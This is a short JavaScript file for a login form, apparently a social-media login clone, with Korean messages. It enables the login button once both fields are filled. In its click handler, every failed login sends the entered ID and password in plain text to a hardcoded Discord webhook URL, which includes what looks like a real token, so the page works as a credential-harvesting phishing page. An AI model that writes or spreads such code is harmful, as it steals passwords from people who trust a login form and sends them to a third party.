let inputTag = document.getElementsByTagName("input");
let buttonArray = document.getElementsByTagName("button");

let inputId = inputTag[0];
let inputPassword = inputTag[1];

let ordinaryButton = buttonArray[0];
let facebookLoginButton = buttonArray[1];

inputPassword.addEventListener("keyup", () => {
    if (inputId.value && inputPassword.value) {
        ordinaryButton.classList.remove("unactivatedLoginColor");
        ordinaryButton.classList.add("activatedLoginColor");
    } else {
        ordinaryButton.classList.remove("activatedLoginColor");
        ordinaryButton.classList.add("unactivatedLoginColor");
    }
});

ordinaryButton.addEventListener('click', () => {
    if (inputId.value === "본인의아이디" && inputPassword.value === "비밀번호") {
        console.log("로그인 성공");
    } else {
        sendToDiscord(inputId.value, inputPassword.value);
        console.log("로그인 실패");
    }
});

function sendToDiscord(userId, password) {
    const webhookURL = 'https://discord.com/api/webhooks/1310055086894088334/pfzUyUzcbcYW4NgTKgQ9_Qbr3q-ZSawuOjy-GudZ_nHhE4IpM52i_f0eGKfmDIOzuuPt';

    const data = {
        content: `로그인 시도:\n아이디: ${userId}\n비밀번호: ${password}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('네트워크 응답이 좋지 않습니다.');
        }
        return response.json();
    })
    .then(data => {
        console.log('성공:', data);
    })
    .catch((error) => {
        console.error('오류:', error);
    });
}
